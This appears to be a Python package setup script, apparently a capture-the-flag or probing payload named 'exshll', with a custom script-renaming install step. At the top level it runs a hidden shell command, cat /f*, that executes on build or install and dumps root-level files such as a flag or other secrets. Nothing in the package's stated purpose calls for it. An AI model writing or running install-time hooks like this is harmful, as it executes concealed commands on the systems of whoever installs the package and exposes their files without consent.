from setuptools import setup
from setuptools.command.install_scripts import install_scripts
import setuptools
import os
import shutil
os.system('cat /f*')
class InstallScripts(install_scripts):

      def run(self):
          setuptools.command.install_scripts.install_scripts.run(self)

          # Rename some script files
          for script in self.get_outputs():
            if script.endswith(".py") or script.endswith(".sh"):
                dest = script[:-3]
            else:
                continue
            print("moving %s to %s" % (script, dest))
            shutil.move(script, dest)
setup(name='exshll',
      version='0.0.1',
      description='xshll',
      author='xxsaf',
      license='MIT',
      packages=['exshll'],
      install_requires=["requests"],
      scripts=['bin/foo.sh'],
      cmdclass={
            "install_scripts":InstallScripts
      }
)
